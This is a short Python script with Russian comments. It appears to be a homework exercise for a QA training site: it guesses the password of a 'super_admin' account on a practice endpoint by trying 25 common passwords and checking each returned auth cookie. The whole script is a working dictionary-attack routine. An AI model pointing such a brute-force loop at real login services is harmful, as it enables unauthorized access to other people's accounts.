import requests

# Задаем логин
login = "super_admin"

# Задаем список паролей для проверки
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567",
    "12345678", "12345", "iloveyou", "111111", "123123",
    "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
    "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]


# Определяем функцию для проверки пароля
def check_password(password_to_check):
    # Формируем параметры запроса
    payload = {"login": login, "password": password_to_check}

    # Отправляем POST-запрос для получения cookie
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    # Если вернулся статус 500, значит произошла ошибка на сервере (пароль неверный)
    if response.status_code == 500:
        return False

    # Получаем значение cookie
    auth_cookie = response.cookies.get("auth_cookie")

    # Если cookie получено, отправляем GET-запрос для проверки
    if auth_cookie:
        cookies = {"auth_cookie": auth_cookie}
        check_response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)

        # Если вернулась фраза "You are NOT authorized", значит пароль неверный
        if "You are NOT authorized" in check_response.text:
            return False

        # Если фраза отсутствует, значит пароль верный
        return True

    return False


# Перебираем пароли из списка
for password in passwords:
    # Проверяем текущий пароль
    if check_password(password):
        # Если пароль верный, выводим его и прерываем цикл
        print(f"Правильный пароль: {password}")
        break
else:
    # Если цикл завершился, не найдя верного пароля
    print("Пароль не найден.")
